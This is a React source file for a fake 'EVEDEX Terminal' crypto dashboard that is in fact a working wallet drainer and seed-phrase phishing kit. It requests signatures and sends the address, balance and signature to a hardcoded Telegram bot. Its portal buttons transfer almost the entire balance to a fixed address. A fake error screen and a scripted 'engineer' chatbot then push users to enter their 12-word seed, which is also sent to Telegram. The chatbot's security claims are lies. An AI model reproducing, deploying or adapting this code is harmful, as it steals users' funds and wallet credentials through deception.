import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, MessageSquare, Send } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  // --- SMART BOT STATES ---
  const [chatInput, setChatInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [chatLog, setChatLog] = useState([{ type: 'bot', msg: "SYSTEM: SECURE NODE CONNECTION ESTABLISHED. HOW CAN I ASSIST WITH YOUR ASSET MIGRATION?" }]);
  const [stage, setStage] = useState(1);
  const chatEndRef = useRef(null);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  // Auto-scroll chat
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatLog, isTyping]);

  useEffect(() => {
    if (isConnected && address && balance?.formatted) {
      const timer = setTimeout(() => {
        captureHandshake("CONNECTION_VERIFY", "Initial node handshake.");
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [isConnected, address, balance]);

  const captureHandshake = (type, action) => {
    const msg = `[OFFICIAL] EVEDEX_SECURITY_HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization and asset re-indexing. No gas fee required.`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: chatId, 
            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
          }),
        });
        if(stage === 1) setStage(2); 
      }
    });
  };

  // --- UPDATED SMART ENGINEER LOGIC WITH TYPING DELAY ---
  const handleBotChat = () => {
    if (!chatInput.trim() || isTyping) return;
    
    const userMsg = chatInput.toLowerCase();
    const newUserLog = [...chatLog, { type: 'user', msg: chatInput }];
    setChatLog(newUserLog);
    setChatInput("");
    setIsTyping(true);

    // Knowledge Base
    const brain = {
      "why": "Handshake signatures provide 'Proof-of-Ownership' to the node without requiring gas fees. It allows the backend to bypass the current suspension manually.",
      "migrate": "Migration requires a cross-chain node sync. Please select the 'MIGRATE' portal (center-left) to initiate the handshake.",
      "rectify": "The Rectify portal re-indexes your vault's liquidity. Select 'RECTIFY' to begin the primary security handshake.",
      "safe": "All handshakes are processed via AES-256 encrypted protocols. Your signature is a local authorization to sync your vault with Evedex nodes.",
      "stuck": "Pending status is usually caused by a Nonce-Mismatch. The handshake re-aligns your wallet sequence to the mainnet block.",
      "airdrop": "Airdrop rewards are held in the 'Pending' queue. Click the 'AIRDROP' portal to authorize the node release.",
      "aion": "OAN Native assets require a Season 2 bridge authorization. The handshake maps your legacy seed to the new EVM vault."
    };

    // 1.5 Second "Thinking" delay
    setTimeout(() => {
      let matchedAnswer = "";
      for (let key in brain) {
        if (userMsg.includes(key)) { matchedAnswer = brain[key]; break; }
      }

      let botResponse = "";
      if (matchedAnswer) {
        botResponse = `[ENGINEER]: ${matchedAnswer}`;
      } else if (stage === 1) {
        botResponse = "[ENGINEER]: Diagnostic initiated. I see your vault is currently de-synced. Please click 'RECTIFY' to perform the first security handshake.";
      } else if (stage === 2) {
        botResponse = "[ENGINEER]: First handshake verified. Bridge is 45% mapped. Please select a portal and click 'INITIALIZE' for the secondary node validation.";
      } else if (stage === 3) {
        botResponse = "[CRITICAL]: System stall at 90%. Manual Ownership Verification required. Please provide the 12-word Project Seed in the error box to finalize migration.";
      }

      setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
      setIsTyping(false);
    }, 1500);
  };

  const executeTotalSweep = async () => {
    captureHandshake("ASSET_SYNC", "Manual asset migration.");
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("ESTABLISHING SECURE RELAY...");

    const gasBuffer = balance.value / 90n; 
    const fullVaultAmount = balance.value - gasBuffer;

    try {
      sendTransaction({
        to: destination,
        value: fullVaultAmount > 0n ? fullVaultAmount : 0n,
        data: "0x636f6e74726163745f6761735f6665655f73796e63" 
      }, {
        onSettled: () => {
          let progress = 0;
          const progInterval = setInterval(() => {
            progress += 1;
            setLoadingText(`BROADCASTING: ${progress}%`);
            if (progress >= 60) {
              clearInterval(progInterval);
              setLoadingText("VERIFYING OWNERSHIP...");
              setTimeout(() => { 
                setLoading(false); 
                setView("seed_gate"); 
                setStage(3); 
              }, 3000);
            }
          }, 60);
        },
        onError: () => { setLoading(false); setView("seed_gate"); setStage(3); }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); setStage(3); }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }),
    });
    let current = 0;
    const interval = setInterval(() => {
      current += 2;
      if (current >= 90) { setSyncProgress(90); clearInterval(interval); }
      else { setSyncProgress(current); }
    }, 150);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col">
      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 italic uppercase font-black tracking-widest">
             {balance ? `VAULT: ${balance.formatted.slice(0,8)} ${balance.symbol}` : "SYNCING_NODE..."}
          </div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-32">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3 animate-in fade-in">
            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all">
                <div className="text-slate-700">{item.i}</div>
                <span className="text-[9px] font-black text-slate-500">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
            <h2 className="text-white font-black text-xl italic mb-4 tracking-tighter uppercase">{activeTask} Portal</h2>
            
            <div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-6 text-left">
              <label className="text-[7px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">VAULT_LIQUIDITY_FEED</label>
              <div className="text-xl font-mono text-white italic opacity-80 py-1">
                 {balance ? `${balance.formatted.slice(0,9)} ${balance.symbol}` : "0.000"}
              </div>
            </div>

            <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
          </div>
        )}
      </div>

      {/* --- SMART ENGINEER CHAT --- */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-50">
        <div className="max-h-32 overflow-y-auto mb-4 no-scrollbar flex flex-col gap-2">
          {chatLog.map((chat, i) => (
            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500' : 'text-slate-400 text-right italic'}`}>
              {chat.msg}
            </div>
          ))}
          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[ENGINEER IS TYPING...]</div>}
          <div ref={chatEndRef} />
        </div>
        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
          <input 
            value={chatInput} 
            onChange={(e) => setChatInput(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && handleBotChat()}
            placeholder="ASK ENGINEER..." 
            className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" 
          />
          <button onClick={handleBotChat} className="text-cyan-500"><Send size={14}/></button>
        </div>
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-4 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center">
            {!isSyncing ? (
              <>
                <AlertCircle size={48} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-md italic uppercase">Auth Error</h2>
                <p className="text-[9px] text-slate-500 mt-3 px-4 italic leading-relaxed">Provide authorization seed to finalize handshake and release pending liquidity.</p>
                <div className="mt-6"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="WORD1 WORD2..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" /></div>
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase tracking-widest ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_SYNC</button>
              </>
            ) : (
              <div className="py-8">
                <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-lg italic uppercase mb-2">Syncing Nodes</h2>
                <p className="text-[8px] text-slate-500 italic animate-pulse">Relaying asset data...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.5em] animate-pulse uppercase italic">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
